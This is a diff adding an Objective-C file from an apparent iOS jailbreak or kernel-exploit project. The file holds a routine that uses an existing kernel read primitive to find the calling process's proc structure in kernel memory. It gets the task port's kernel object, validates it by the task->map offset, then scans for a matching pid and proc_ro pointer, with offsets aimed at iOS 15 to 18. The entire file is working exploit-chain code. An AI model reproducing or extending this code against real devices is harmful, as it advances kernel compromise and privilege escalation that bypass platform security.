@@ -1,0 +1,78 @@
+//
+//  Lum1naProcFind.m
+//  Lum1na
+//
+
+#import "Lum1naProcFind.h"
+#import "Lum1naKreadLane.h"
+#import "../Exploit/lumina_core.h"
+
+#import <mach/mach.h>
+#import <mach/mach_port.h>
+
+#include <unistd.h>
+
+/* task->map is stable at 0x28 across the iOS 15/16/17/18 ladders
+   (Dopamine info.c task.map = 0x28). Used only to sanity-check that the
+   kobject really is a task_t before scanning it. */
+#define LP_TASK_MAP 0x28
+
+static uint64_t lp_kread64(uint64_t a) { return Lum1naLaneKRead64(a); }
+static uint32_t lp_kread32(uint64_t a) { return Lum1naLaneKRead32(a); }
+
+/// A proc candidate is accepted only when pid at +pidOff is ours AND the
+/// proc_ro pointer at +procRoOff is a zone pointer AND the pid still reads
+/// ours after that second read. A stale/wrong pointer cannot pass all three.
+static uint64_t lp_try_proc(uint64_t cand, uint32_t pid, uint32_t pidOff,
+                            uint32_t procRoOff) {
+    if (!cand || !lumina_kptr_zone(cand)) return 0;
+    if (lp_kread32(cand + pidOff) != pid) return 0;
+    uint64_t pro = lp_kread64(cand + procRoOff);
+    if (!pro || !lumina_kptr_zone(pro)) return 0;
+    if (lp_kread32(cand + pidOff) != pid) return 0;
+    return cand;
+}
+
+uint64_t Lum1naFindSelfProc(uint32_t pid, uint32_t pidOff, uint32_t procRoOff,
+                            NSString **how) {
+    if (how) *how = @"none";
+    if (!pid || !pidOff || !procRoOff) return 0;
+
+    mach_port_type_t ptype = 0;
+    mach_vm_address_t kobj = 0;
+    kern_return_t kr = mach_port_kobject(mach_task_self(), mach_task_self(),
+                                         &ptype, &kobj);
+    if (kr != KERN_SUCCESS || !kobj) {
+        if (how) *how = [NSString stringWithFormat:
+            @"mach_port_kobject refused (kr=0x%x type=0x%x)", kr, ptype];
+        return 0;
+    }
+
+    /* The kobject for a task port is task_t. Validate before trusting the
+       scan: task->map must be a zone pointer. If it is not, the locator
+       returned an ipc_port or a different object — refuse rather than scan
+       an arbitrary kernel object. */
+    uint64_t map = lp_kread64((uint64_t)kobj + LP_TASK_MAP);
+    if (!lumina_kptr_zone(map)) {
+        if (how) *how = [NSString stringWithFormat:
+            @"kobject 0x%llx is not a task (map=0x%llx)",
+            (unsigned long long)kobj, (unsigned long long)map];
+        return 0;
+    }
+
+    for (uint32_t off = 0; off < 0x1000; off += 8) {
+        uint64_t q = lp_kread64((uint64_t)kobj + off);
+        uint64_t p = lp_try_proc(q, pid, pidOff, procRoOff);
+        if (p) {
+            if (how) *how = [NSString stringWithFormat:
+                @"task 0x%llx -> bsd_info@+0x%x -> proc 0x%llx",
+                (unsigned long long)kobj, off, (unsigned long long)p];
+            return p;
+        }
+    }
+
+    if (how) *how = [NSString stringWithFormat:
+        @"task 0x%llx scanned 0x1000, no proc with pid %u",
+        (unsigned long long)kobj, pid];
+    return 0;
+}
